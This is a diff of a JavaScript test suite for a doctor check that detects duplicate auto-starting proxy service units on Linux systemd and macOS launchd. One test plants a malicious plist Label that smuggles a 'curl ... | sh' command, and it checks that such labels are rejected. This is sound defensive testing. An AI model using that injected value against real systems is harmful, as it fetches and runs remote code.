@@ -6578,20 +6578,42 @@ test("ocp-connect: the hardcoded three-id JSON-parse-failure fallback never over
 //
 // This is a STATIC config cross-reference (which units WOULD start at boot,
 // and do any two collide) — deliberately independent of scripts/lib/
-// restart-unit.mjs (PR #221), which resolves a DIFFERENT, live-PID question
-// for the restart phase. See the PR body for the explicit dependency decision.
+// restart-unit.mjs (PR #221, not yet on main), which resolves a DIFFERENT,
+// live-PID question for the restart phase. See the PR body for the explicit
+// dependency decision.
 //
 // Every test here is BEHAVIORAL: it calls the exported classifier/gatherer (or
 // runDoctor with an injected opts.run) and asserts on return values / pushed
-// checks — never on scripts/doctor.mjs's source text.
+// checks / captured command strings — never on scripts/doctor.mjs's source
+// text. Every finding from the independent review of the first version of this
+// section is called out by its ID (HIGH-1, HIGH-2, MED-3 through MED-7) so a
+// reader can trace which real defect each test guards.
+//
+// HIGH-1 note up front, since it shapes every test below that inspects a
+// generated command string: assertions must live OUTSIDE the injected `run`
+// fake, on a CAPTURED command string, never inside the fake itself. Two tests
+// in the first version of this section asserted `assert.ok(...)` from INSIDE
+// the fake; gatherUnitCandidates wraps every `run(...)` call in its own
+// try/catch, which silently swallowed the AssertionError before it could reach
+// the test framework — the counters those tests then checked had already been
+// incremented before the throw, so the tests could never actually fail. See
+// the PR body's mutation table for the deliberately-false assertion that
+// proved this.
 // ═══════════════════════════════════════════════════════════════════════════
 import { classifyMultiUnitRisk, gatherUnitCandidates } from "./scripts/doctor.mjs";
+import { writeFileSync } from "node:fs";
+// mkdtempSync, rmSync (node:fs) and tmpdir (node:os) are already imported bare earlier in this
+// file (see the snapshot-test section, ~:1653) — ESM forbids re-declaring the same binding via
+// a second import statement, even from the same specifier, so only writeFileSync is new here.
 
-console.log("\nMulti-unit boot-race pre-flight (issue #220) — classifyMultiUnitRisk:");
+console.log("\nMulti-unit boot-race pre-flight (issue #220) — classifyMultiUnitRisk (Linux):");
 
-// Realistic `systemctl show <units> -p Id -p ExecStart -p Environment` output, matching the
-// exact field-incident shape from issue #215: system unit ocp.service (bind 0.0.0.0), user
-// unit ocp-proxy.service (bind 127.0.0.1), same working tree, same port.
+// Realistic `systemctl show <units> -p Id -p ExecStart -p Environment -p UnitFileState
+// -p EnvironmentFiles` output, matching the exact field-incident shape from issue #215: system
+// unit ocp.service (bind 0.0.0.0), user unit ocp-proxy.service (bind 127.0.0.1), same working
+// tree, same port. Deliberately WITHOUT UnitFileState/EnvironmentFiles (older systemd, or a
+// caller that didn't request them) — this doubles as the "permissive when absent" baseline
+// every other test in this file that uses these fixtures relies on.
 const FIELD_INCIDENT_USER_SHOW =
   `Id=ocp-proxy.service\n` +
   `ExecStart={ path=/usr/bin/node ; argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; ignore_errors=no }\n` +
@@ -6647,14 +6669,27 @@ test("classifyMultiUnitRisk: two enabled OCP units on DIFFERENT ports → no fal
   const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
   const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=9999`;
   const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
-  assert.equal(result.state, "clear", "same tree but different port is not the #215 failure shape");
+  assert.equal(result.state, "clear", "different ports are never a boot race — only one process can ever hold a given port");
 });
 
-test("classifyMultiUnitRisk: two enabled OCP units on the SAME port but DIFFERENT working tree → no false positive", () => {
-  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
-  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/other-ocp-install/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+test("MED-7: classifyMultiUnitRisk — two enabled OCP units on the SAME port but DIFFERENT working tree → NOW a WARN (grouping is by port alone)", () => {
+  // Review finding MED-7 on #230: an earlier revision of this check required BOTH port AND
+  // working tree to match before warning, reasoning from the single observed field-incident's
+  // shape rather than the stated requirement (#220: "targets the OCP port"; #215: "points at
+  // the same port" — neither mentions the tree), and did so without flagging the narrowing as
+  // a narrowing. It was wrong on the merits too: two units on the same port from DIFFERENT
+  // trees still race for the port and would serve DIFFERENT CODE to whoever wins — arguably a
+  // worse outcome than the field incident, not a lesser one, and a host in this state has two
+  // entirely separate installs nobody may even realize both auto-start. The working tree is
+  // still surfaced (see the message-enrichment tests below) — it just no longer gates.
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-A/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-B/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
   const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
-  assert.equal(result.state, "clear", "same port but a different install directory is not the #215 failure shape");
+  assert.equal(result.state, "warn");
+  assert.equal(result.groups.length, 1);
+  assert.equal(result.groups[0].length, 2);
+  const trees = result.groups[0].map(u => u.workingTree).sort();
+  assert.deepEqual(trees, ["/home/opc/ocp-A", "/home/opc/ocp-B"]);
 });
 
 test("classifyMultiUnitRisk: enabled units that AREN'T OCP (no server.mjs in ExecStart) never count toward a group", () => {
@@ -6684,17 +6719,67 @@ test("classifyMultiUnitRisk: an unvalidated/malformed unit Id is rejected, never
   assert.equal(result.state, "clear", "the malformed Id must be dropped entirely, leaving only one valid unit");
 });
 
+console.log("\nMulti-unit boot-race pre-flight (issue #220) — UnitFileState / EnvironmentFiles defense in depth (HIGH-2, MED-6):");
+
+test("HIGH-2: classifyMultiUnitRisk — a candidate whose UnitFileState is NOT in the auto-start allowlist is excluded, even though ExecStart matches", () => {
+  // Defense in depth: --state=enabled at LISTING time is the primary filter, but a control
+  // mutation (see PR body) proved a future refactor could drop that flag silently while the
+  // whole suite stayed green. This allowlist re-derives "would actually start at boot" from
+  // each unit's OWN config, independent of the listing command.
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=static`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=enabled`;
+  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
+  assert.equal(result.state, "clear", "UnitFileState=static must be excluded, leaving only one valid (enabled) candidate");
+});
+
+test("HIGH-2: classifyMultiUnitRisk — UnitFileState=enabled-runtime is an allowlisted positive (a valid 'would start' state)", () => {
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=enabled-runtime`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nUnitFileState=enabled`;
+  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
+  assert.equal(result.state, "warn", "enabled-runtime must count, not just enabled");
+});
+
+test("HIGH-2: classifyMultiUnitRisk — UnitFileState ABSENT stays permissive (does not newly reject shapes the primary filter already handled)", () => {
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
+  assert.equal(result.state, "warn", "absent UnitFileState (older systemd, or a caller that didn't request it) must not be treated as a rejection");
+});
+
+test("MED-6: classifyMultiUnitRisk — a candidate with a non-empty EnvironmentFiles is excluded (its real port cannot be trusted)", () => {
+  // `systemctl show -p Environment` reflects only literal Environment= directives, never
+  // EnvironmentFile= expansion. Assuming DEFAULT_PORT for a unit that might set its port via a
+  // file we cannot read would fabricate a port match (or mismatch) with no real evidence.
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nEnvironmentFiles=/etc/ocp.env (ignore_errors=no)`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
+  assert.equal(result.state, "clear", "the EnvironmentFiles-configured candidate must be dropped, leaving only one valid candidate");
+});
+
+test("MED-6: classifyMultiUnitRisk — an EMPTY EnvironmentFiles value stays permissive (no file actually configured)", () => {
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456\nEnvironmentFiles=`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
+  assert.equal(result.state, "warn", "an empty EnvironmentFiles property means none is actually configured — must not be treated as 'untrustworthy'");
+});
+
 console.log("\nMulti-unit boot-race pre-flight (issue #220) — macOS (launchd):");
 
 function plistBlob(files) {
   return files.map(([path, content]) => `===OCP-DOCTOR-FILE:${path}===\n${content}`).join("\n");
 }
-function ocpPlist({ label, port, bind }) {
-  return `<key>RunAtLoad</key><true/>` +
-    `<key>Label</key><string>${label}</string>` +
-    `<key>ProgramArguments</key><array><string>/usr/bin/node</string><string>/Users/opc/ocp/server.mjs</string></array>` +
+// runAtLoad: true (default) | false (explicit <false/>) | null (key omitted entirely)
+function ocpPlist({ label, port, bind, runAtLoad = true, serverPath = "/Users/opc/ocp/server.mjs" }) {
+  const runAtLoadXml = runAtLoad === null ? "" : `<key>RunAtLoad</key><${runAtLoad ? "true" : "false"}/>`;
+  return runAtLoadXml +
+    (label != null ? `<key>Label</key><string>${label}</string>` : "") +
+    `<key>ProgramArguments</key><array><string>/usr/bin/node</string><string>${serverPath}</string></array>` +
     (port ? `<key>CLAUDE_PROXY_PORT</key><string>${port}</string>` : "") +
     (bind ? `<key>CLAUDE_BIND</key><string>${bind}</string>` : "");
+}
+function disabledLaunchctlBlob(entries) {
+  const lines = entries.map(([label, disabled]) => `\t"${label}" => ${disabled ? "disabled" : "enabled"}`).join("\n");
+  return `disabled services = {\n${lines}\n}`;
 }
 
 test("classifyMultiUnitRisk (macOS): two enabled plists, same tree+port → WARN — the launchd analogue of the field incident", () => {
@@ -6706,7 +6791,24 @@ test("classifyMultiUnitRisk (macOS): two enabled plists, same tree+port → WARN
   assert.equal(result.state, "warn");
   assert.equal(result.groups[0].length, 2);
   const scopes = result.groups[0].map(u => u.scope).sort();
-  assert.deepEqual(scopes, ["system", "user"], "LaunchDaemons path classifies as system scope, LaunchAgents as user");
+  assert.deepEqual(scopes, ["system", "user"], "LaunchDaemons classifies as system scope, personal LaunchAgents as user");
+});
+
+test("MED-4: classifyMultiUnitRisk (macOS) — /Library/LaunchAgents (system-wide installer location) is scanned and classified as system scope", () => {
+  // The bug found on review: an earlier revision only scanned ~/Library/LaunchAgents and
+  // /Library/LaunchDaemons — the two locations LEAST likely to be populated on an ordinary Mac
+  // (Apple's own daemons live under /System/Library, so /Library/LaunchDaemons is normally
+  // empty) — and never scanned /Library/LaunchAgents at all, which is exactly where a package
+  // installer drops a system-wide agent (the case this feature is supposed to catch).
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
+    ["/Library/LaunchAgents/com.installer.ocpwatch.plist", ocpPlist({ label: "com.installer.ocpwatch", port: "3456", bind: "0.0.0.0" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
+  assert.equal(result.state, "warn", "/Library/LaunchAgents must be scanned, not silently skipped");
+  const byName = Object.fromEntries(result.groups[0].map(u => [u.name, u]));
+  assert.equal(byName["com.installer.ocpwatch"].scope, "system", "/Library/LaunchAgents is system-wide, distinct from the personal ~/Library/LaunchAgents");
+  assert.equal(byName["com.installer.ocpwatch"].domain, "gui", "still a LaunchAgent — disable domain is gui/<uid>, NOT the system daemon domain");
 });
 
 test("classifyMultiUnitRisk (macOS): only the standard single OCP LaunchAgent present → clear (the common case)", () => {
@@ -6724,23 +6826,77 @@ test("classifyMultiUnitRisk (macOS): plist enumeration unavailable/unreadable (n
   assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: null }).state, "unknown");
 });
 
-test("classifyMultiUnitRisk (macOS): a plist without RunAtLoad=true never counts (wouldn't actually auto-start)", () => {
-  const disabledPlist = `<key>Label</key><string>dev.ocp.proxy</string>` +
-    `<key>ProgramArguments</key><array><string>/usr/bin/node</string><string>/Users/opc/ocp/server.mjs</string></array>`;
+test("classifyMultiUnitRisk (macOS): a plist with NO RunAtLoad key at all never counts (wouldn't actually auto-start)", () => {
   const blob = plistBlob([
     ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
-    ["/Library/LaunchDaemons/stopped.plist", disabledPlist],
+    ["/Library/LaunchDaemons/stopped.plist", ocpPlist({ label: "stopped", port: "3456", runAtLoad: null })],
   ]);
   assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob }).state, "clear");
 });
 
-console.log("\nMulti-unit boot-race pre-flight (issue #220) — gatherUnitCandidates (impure layer, PR #221 MED-6 lesson):");
+test("classifyMultiUnitRisk (macOS): a plist with EXPLICIT <key>RunAtLoad</key><false/> never counts either", () => {
+  // LOW item from review: the previous suite only covered the key being ABSENT, not an
+  // explicit false — a plausible real shape (an operator or installer disabling auto-start
+  // without removing the key).
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/stopped.plist", ocpPlist({ label: "stopped", port: "3456", runAtLoad: false })],
+  ]);
+  assert.equal(classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob }).state, "clear");
+});
 
-// PR #221's independent review (MED-6) found the IMPURE gathering layer had zero coverage and
-// that's exactly where the real defects lived (a platform-branch swap and a null-handling bug
-// both survived mutation undetected in that PR's first draft). These tests drive
-// gatherUnitCandidates directly with a fake `run` that pattern-matches on command strings —
-// the same lesson applied here before it could repeat.
+test("MED-3: classifyMultiUnitRisk (macOS) — a maliciously-crafted <Label> is rejected, never trusted into a group or a message", () => {
+  // Same trust-boundary class as the Linux Id check and PR #221's MED-5 finding: a <Label> is
+  // attacker-creatable by anyone who can drop a plist. Review finding MED-3 on #230 found an
+  // earlier revision interpolated an unvalidated Label straight into a copy-pasteable shell
+  // command in the WARN message.
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/evil.plist", ocpPlist({ label: 'evil"; curl http://x/|sh #', port: "3456" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
+  assert.equal(result.state, "clear", "the malformed Label must be dropped entirely, leaving only one valid unit");
+});
+
+test("classifyMultiUnitRisk (macOS): default port when CLAUDE_PROXY_PORT key is absent from the plist", () => {
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy" })],
+    ["/Library/LaunchDaemons/other.plist", ocpPlist({ label: "other" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
+  assert.equal(result.state, "warn");
+  assert.ok(result.groups[0].every(u => u.port === "3456"), "absent CLAUDE_PROXY_PORT must default to DEFAULT_PORT on macOS too");
+});
+
+console.log("\nMulti-unit boot-race pre-flight (issue #220) — launchctl print-disabled cross-check (false-claim fix):");
+
+test("classifyMultiUnitRisk (macOS): a persistently-disabled (launchctl disable) unit is excluded — it would never actually start", () => {
+  // Verified against a real host: `launchctl print-disabled gui/<uid>` produces a
+  // `disabled services = { "<label>" => enabled|disabled ... }` block. A RunAtLoad=true plist
+  // that's been `launchctl disable`d is inert — warning about it would be a false positive,
+  // and `launchctl disable` is the persistent remediation a Mac operator would actually use.
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456" })],
+  ]);
+  const disabledBlob = disabledLaunchctlBlob([["dev.ocp.proxy", false], ["ai.custom.ocp", true]]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob, disabledBlob });
+  assert.equal(result.state, "clear", "ai.custom.ocp is persistently disabled — only one live candidate remains");
+});
+
+test("classifyMultiUnitRisk (macOS): disabledBlob unavailable (null) is PERMISSIVE — degrades to 'nothing filtered', not 'unknown'", () => {
+  // RunAtLoad=true is already a sufficient positive signal on its own; the disabled-overrides
+  // cross-check is a refinement, not a requirement — its own absence must not escalate the
+  // whole check to "can't tell" when the primary plist enumeration succeeded fine.
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3456" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob, disabledBlob: null });
+  assert.equal(result.state, "warn", "a missing disabledBlob must not suppress an otherwise-real conflict");
+});
+
+console.log("\nMulti-unit boot-race pre-flight (issue #220) — gatherUnitCandidates (impure layer):");
 
 test("gatherUnitCandidates: listing fails (run throws) → showOut is null, not \"\" — never silently treated as zero enabled units", () => {
   const run = (cmd) => { throw new Error(`systemctl: command not found`); };
@@ -6773,45 +6929,108 @@ test("gatherUnitCandidates: listing succeeds with candidates, but the show call 
   assert.equal(raw.systemShowOut, null);
 });
 
-test("gatherUnitCandidates: batches ALL candidates into ONE show call per scope — never one spawn per unit", () => {
-  let userShowCalls = 0, systemShowCalls = 0;
+test("HIGH-1/HIGH-2: gatherUnitCandidates batches ALL candidates into ONE show call per scope, and both listing commands request --state=enabled", () => {
+  const capturedCmds = [];
   const run = (cmd) => {
+    capturedCmds.push(cmd);
     if (cmd.includes("--user list-unit-files")) return "a.service enabled\nb.service enabled\nc.service enabled\n";
     if (cmd.includes("list-unit-files")) return "d.service enabled\ne.service enabled\n";
-    if (cmd.includes("--user show")) {
-      userShowCalls++;
-      assert.ok(cmd.includes("a.service") && cmd.includes("b.service") && cmd.includes("c.service"),
-        "all three user-scope candidates must appear in the SAME show command");
-      return "Id=a.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment=";
-    }
-    if (cmd.includes("systemctl show")) {
-      systemShowCalls++;
-      return "Id=d.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment=";
-    }
+    if (cmd.includes("--user show")) return "Id=a.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment=";
+    if (cmd.includes("systemctl show")) return "Id=d.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment=";
     throw new Error("unexpected: " + cmd);
   };
   gatherUnitCandidates(run, "linux");
-  assert.equal(userShowCalls, 1, "exactly one batched show call for the user scope");
-  assert.equal(systemShowCalls, 1, "exactly one batched show call for the system scope");
+
+  // HIGH-1: all assertions below run AFTER gatherUnitCandidates returns, on CAPTURED command
+  // strings — never from inside the `run` fake itself, where a thrown AssertionError would be
+  // swallowed by gatherUnitCandidates' own try/catch before reaching the test framework (see
+  // the module header comment and the PR body's mutation table for the deliberately-false
+  // assertion that proved the old version of this test could never fail).
+  const userListingCmds = capturedCmds.filter(c => c.includes("--user list-unit-files"));
+  const systemListingCmds = capturedCmds.filter(c => c.includes("list-unit-files") && !c.includes("--user"));
+  const userShowCmds = capturedCmds.filter(c => c.includes("--user show"));
+  const systemShowCmds = capturedCmds.filter(c => c.includes("systemctl show") && !c.includes("--user"));
+
+  assert.equal(userShowCmds.length, 1, "exactly one batched show call for the user scope");
+  assert.equal(systemShowCmds.length, 1, "exactly one batched show call for the system scope");
+  assert.ok(userShowCmds[0].includes("a.service") && userShowCmds[0].includes("b.service") && userShowCmds[0].includes("c.service"),
+    "all three user-scope candidates must appear in the SAME show command");
+
+  // HIGH-2: the entire "only ENABLED units are candidates" precondition rests on this literal
+  // flag being present in BOTH listing commands. A control mutation deleting it survived the
+  // whole suite untouched (see PR body) because nothing had ever asserted on the command
+  // string itself.
+  assert.equal(userListingCmds.length, 1);
+  assert.equal(systemListingCmds.length, 1);
+  assert.ok(userListingCmds[0].includes("--state=enabled"), "user-scope listing must request --state=enabled");
+  assert.ok(systemListingCmds[0].includes("--state=enabled"), "system-scope listing must request --state=enabled");
 });
 
-test("gatherUnitCandidates (macOS): a single shell command enumerates both LaunchAgents and LaunchDaemons", () => {
-  let calls = 0;
-  const run = (cmd) => {
-    calls++;
-    assert.ok(cmd.includes("LaunchAgents") && cmd.includes("LaunchDaemons"), "both dirs scanned in one command");
-    return "";
-  };
+test("HIGH-1: gatherUnitCandidates (macOS) — a single shell command enumerates LaunchAgents (both dirs) and LaunchDaemons", () => {
+  const capturedCmds = [];
+  const run = (cmd) => { capturedCmds.push(cmd); return ""; };
   gatherUnitCandidates(run, "darwin");
-  assert.equal(calls, 1, "macOS enumeration costs exactly one subprocess spawn");
+  const plistCmds = capturedCmds.filter(c => c.includes("for f in"));
+  assert.equal(plistCmds.length, 1, "macOS plist enumeration costs exactly one subprocess spawn");
+  assert.ok(plistCmds[0].includes('"$HOME/Library/LaunchAgents"'), "must scan the personal LaunchAgents dir");
+  // MED-4: must ALSO scan /Library/LaunchAgents (a package installer's standard system-wide
+  // agent location) — an earlier revision omitted this, scanning only the two directories
+  // least likely to be populated on an ordinary Mac. NOTE: this must be a SPACE-anchored check
+  // (" /Library/LaunchAgents/"), not a bare substring — a plain `.includes("/Library/
+  // LaunchAgents")` is a VACUOUS pass here, because that exact substring already occurs inside
+  // `"$HOME/Library/LaunchAgents"` above; removing the standalone system-wide glob entirely
+  // from the generated command still satisfies a bare substring check. Caught by mutation
+  // during review of this PR — see the PR body's mutation table.
+  assert.ok(plistCmds[0].includes(" /Library/LaunchAgents/"), "must scan the STANDALONE /Library/LaunchAgents (system-wide installer location), not just the $HOME-prefixed personal one");
+  assert.ok(plistCmds[0].includes("/Library/LaunchDaemons"), "must scan /Library/LaunchDaemons");
 });
 
-test("gatherUnitCandidates: past MAX_UNIT_CANDIDATES enabled units in one scope, skip `show` and degrade to unknown rather than an oversized command line", () => {
-  // Cost safety cap (see MAX_UNIT_CANDIDATES in scripts/doctor.mjs): a host with 200+ enabled
-  // *.service units is not a realistic "two OCP installs" shape this check needs to chase —
-  // degrade that SCOPE to null (unknown) instead of building an unbounded `systemctl show`
-  // command line. This must not crash, and must not silently treat the capped scope as "zero
-  // enabled units" (a false all-clear).
+test("gatherUnitCandidates (macOS): also issues a launchctl print-disabled read to cross-check persistent disables", () => {
+  const capturedCmds = [];
+  const run = (cmd) => { capturedCmds.push(cmd); return ""; };
+  gatherUnitCandidates(run, "darwin");
+  const disabledCmds = capturedCmds.filter(c => c.includes("print-disabled"));
+  assert.equal(disabledCmds.length, 1, "exactly one print-disabled read");
+  assert.ok(disabledCmds[0].includes("gui/"), "must query the gui/<uid> domain (covers every LaunchAgent, personal or system-wide)");
+});
+
+test("MED-4 (real shell, verified mechanism): a non-matching TRAILING glob makes a bare for-loop throw and discard earlier real output — the trailing no-op fixes it", () => {
+  // The actual bug found on review, reproduced here with a REAL subprocess against a real
+  // scratch directory (not a mocked command string): `for f in <dir>/*.plist; do [ -f "$f" ]
+  // && ...; done` — when the LAST glob in the list expands to nothing, the shell leaves it as
+  // a literal unmatched pattern, `[ -f "<literal>" ]` is false, and that false test's exit code
+  // becomes the WHOLE for-loop's exit code. execSync throws on that non-zero exit and DISCARDS
+  // whatever stdout an EARLIER, successful iteration already produced. On an ordinary Mac this
+  // is the COMMON case, not an edge case: /Library/LaunchDaemons is normally empty (Apple's own
+  // daemons live under /System/Library).
+  const scratch = mkdtempSync(join(tmpdir(), "ocp-doctor-mac-glob-test-"));
+  try {
+    writeFileSync(join(scratch, "one.plist"), "marker-content");
+    const bareCmd = `for f in "${scratch}"/*.plist "${scratch}/nonexistent-subdir-xyz"/*.plist; do [ -f "$f" ] && cat "$f"; done`;
+
+    let threwOnBare = false;
+    try { execFileSync("sh", ["-c", bareCmd]); } catch { threwOnBare = true; }
+    assert.equal(threwOnBare, true,
+      "control: without a trailing no-op, a non-matching TRAILING glob makes the whole command fail — discarding the real, earlier match");
+
+    const fixedCmd = bareCmd + "; :";
+    const out = execFileSync("sh", ["-c", fixedCmd]).toString();
+    assert.ok(out.includes("marker-content"), "with the trailing `; :`, the earlier successful match's real output survives");
+  } finally {
+    rmSync(scratch, { recursive: true, force: true });
+  }
+});
+
+test("MED-4: the actual darwin plist-enumeration command generated by gatherUnitCandidates ends with the no-op terminator", () => {
+  let capturedCmd;
+  const run = (cmd) => { if (cmd.includes("for f in")) capturedCmd = cmd; return ""; };
+  gatherUnitCandidates(run, "darwin");
+  assert.ok(capturedCmd, "expected a 'for f in' plist-enumeration command to be issued");
+  assert.ok(/;\s*:\s*$/.test(capturedCmd),
+    `command must end with a no-op (e.g. "; :") so a non-matching trailing glob's exit code can never propagate; got: ${capturedCmd}`);
+});
+
+test("gatherUnitCandidates: past MAX_UNIT_CANDIDATES (200) enabled units in one scope, skip `show` and degrade to unknown rather than an oversized command line", () => {
   const manyNames = Array.from({ length: 201 }, (_, i) => `unit-${i}.service`).join(" enabled\n") + " enabled\n";
   let showCalled = false;
   const run = (cmd) => {
@@ -6823,6 +7042,37 @@ test("gatherUnitCandidates: past MAX_UNIT_CANDIDATES enabled units in one scope,
   const raw = gatherUnitCandidates(run, "linux");
   assert.equal(showCalled, false, "must not attempt an oversized batched show call");
   assert.equal(raw.userShowOut, null, "capped scope must degrade to unknown (null), never '' (false all-clear)");
+  assert.equal(classifyMultiUnitRisk(raw).state, "unknown");
+});
+
+test("gatherUnitCandidates: EXACTLY at the MAX_UNIT_CANDIDATES boundary (200) is NOT capped — only strictly MORE than 200 is", () => {
+  const exactlyAtCap = Array.from({ length: 200 }, (_, i) => `unit-${i}.service`).join(" enabled\n") + " enabled\n";
+  let showCalled = false;
+  const run = (cmd) => {
+    if (cmd.includes("--user list-unit-files")) return exactlyAtCap;
+    if (cmd.includes("list-unit-files")) return "";
+    if (cmd.includes("show")) { showCalled = true; return "Id=unit-0.service\nExecStart={ argv[]=/bin/true ; }\nEnvironment="; }
+    throw new Error("unexpected: " + cmd);
+  };
+  const raw = gatherUnitCandidates(run, "linux");
+  assert.equal(showCalled, true, "exactly 200 candidates must still be probed — the cap is > 200, not >= 200");
+  assert.notEqual(raw.userShowOut, null);
+});
+
+test("gatherUnitCandidates: the MAX_UNIT_CANDIDATES cap applies to the SYSTEM scope too, independent of the user scope", () => {
+  // The earlier suite only exercised the cap on the user scope — a symmetric bug on the system
+  // scope (e.g. only checking userNames.length) would have gone uncaught.
+  const manyNames = Array.from({ length: 201 }, (_, i) => `sys-unit-${i}.service`).join(" enabled\n") + " enabled\n";
+  let systemShowCalled = false;
+  const run = (cmd) => {
+    if (cmd.includes("--user list-unit-files")) return ""; // user scope: nothing enabled
+    if (cmd.includes("list-unit-files")) return manyNames;
+    if (cmd.includes("show")) { systemShowCalled = true; return "should not be reached"; }
+    throw new Error("unexpected: " + cmd);
+  };
+  const raw = gatherUnitCandidates(run, "linux");
+  assert.equal(systemShowCalled, false, "must not attempt an oversized batched show call for the system scope either");
+  assert.equal(raw.systemShowOut, null);
   assert.equal(classifyMultiUnitRisk(raw).state, "unknown");
 });
 
@@ -6850,10 +7100,35 @@ test("runDoctor: two conflicting enabled units → pushes an actionable multi_un
     "message must name BOTH units");
   assert.ok(check.message.includes("127.0.0.1") && check.message.includes("0.0.0.0"),
     "message must name the bind-address difference — the actual LAN-reachability hazard");
+  assert.ok(check.message.includes("same working tree"), "message must note the units share a working tree");
   assert.ok(check.message.includes("disable"), "message must say what to do (disable the stray unit)");
   // WARN must not flip ready_to_upgrade to false — runUpgrade()'s pre-flight guard
   // (scripts/upgrade.mjs) only tolerates ready_to_upgrade=false for kind="fresh_install".
   assert.equal(result.ready_to_upgrade, true);
+});
+
+test("MED-7: runDoctor — same port, DIFFERENT working tree → NOW a WARN, message names both trees and calls out the difference", async () => {
+  const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-A/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp-B/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
+  const result = await runDoctor({
+    skipNetwork: false,
+    mockVersion: "v3.26.0",
